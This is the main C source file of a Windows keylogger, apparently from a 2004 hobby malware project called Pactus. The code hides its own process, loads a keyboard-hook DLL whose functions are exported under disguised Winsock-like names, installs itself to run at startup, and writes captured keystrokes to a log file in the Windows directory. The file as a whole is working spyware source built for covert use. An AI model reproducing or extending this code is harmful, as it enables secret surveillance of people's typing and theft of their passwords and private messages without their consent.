/*++ 

  Module Name:
  
	main.c

  Abstract:

	This source is main of keylogger executable, it call the functions
	from keylogger DLL and stay invisible to the user.

  Author:

	Daniel Koch (Backz)

  History:

	May-2004 Daniel K.
		Created.

--*/

#include <windows.h>
#include <stdio.h>
#include "main.h"
#include "../common/show_error.h"
#include "install.h"

static char filename[MAX_PATH];

int WINAPI WinMain(HINSTANCE hInstance,
				   HINSTANCE hPrevInstance,
				   LPSTR lpCmdLine,
				   int nShowCmd)

{

	MSG Msg;
	HMODULE myDll;

	// functions type
	STARTKEYLOGGER_T start_keylogger;
	STOPKEYLOGGER_T stop_keylogger;

	// setting up if show error messages or no!
	set_show_error(FALSE);

	// hide process on the system
	if(!hide_process()) exit(1);

	myDll = LoadLibrary(HOOK_DLL_FILE);
	if(myDll == NULL)
	{
		show_error("Error loading hook DLL!");
		exit(1);
	}

	// getting functions from DLL
	start_keylogger = (STARTKEYLOGGER_T) GetProcAddress(myDll, "WSARunStack");
	stop_keylogger = (STOPKEYLOGGER_T) GetProcAddress(myDll, "WSACleanStack");

	if((start_keylogger == NULL) || (stop_keylogger == NULL))
	{
		show_error("Error calling functions from DLL");
		FreeLibrary(myDll);
		exit(1);
	}

	// install in start up
	install_startup();

	GetWindowsDirectory(filename, MAX_PATH);
	strcat(filename, "\\");
	strcat(filename, LOG_FILENAME);


	// starting the keylogger
	if(!start_keylogger(filename, FALSE))
	{
		FreeLibrary(myDll);
		exit(1);
	}

	
    if(!RegisterHotKey(NULL, 1, MOD_CONTROL, VK_F11))
	{
		show_error("Error registering hotkeys");
		exit(1);
	}


	// message loop
	while(GetMessage(&Msg, NULL, 0, 0) > 0)
	{
		switch(Msg.message)
		{
		case WM_HOTKEY:
			{
				// if user press the hotkey
				int reason = MessageBox(NULL, "Pactus: Do you want exit?", "Alert:", MB_YESNO+MB_ICONQUESTION);
				if(reason == IDYES)
				{
					stop_keylogger();
					show_alert("Pactus: exiting...");
					PostQuitMessage(0);
				}
			}
		}
	}	

  UnregisterHotKey(NULL,1);
	FreeLibrary(myDll);

	return 0;
}
